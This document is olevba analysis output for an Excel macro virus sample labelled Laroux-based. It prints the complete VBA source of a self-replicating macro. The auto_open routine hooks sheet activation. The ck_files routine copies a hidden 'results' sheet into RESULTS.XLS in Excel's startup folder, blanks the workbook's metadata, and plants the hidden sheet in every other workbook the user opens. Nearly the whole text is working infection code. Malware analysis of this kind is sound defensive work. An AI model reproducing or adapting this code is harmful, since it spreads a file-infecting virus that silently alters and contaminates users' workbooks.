olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-15d1e023df727ad39de59dd154429d645fe9742e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO results.bas 
in file: Virus.MSExcel.Laroux-based-15d1e023df727ad39de59dd154429d645fe9742e - OLE stream: '_VBA_PROJECT_CUR/VBA/results'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "ck_files"
End Sub

Sub ck_files()
Attribute ck_files.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next 'jsk
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "RESULTS.XLS")
    If m$ = "RESULTS.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("results").Visible = True
    Sheets("results").Select
    Sheets("results").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "RESULTS.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("results").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "RESULTS.XLS!ck_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "results" Then
        Workbooks("RESULTS.XLS").Sheets("results").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("results").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "RESULTS.XLS!ck_files"
    Case Else
End Select
End Sub



-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  result
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

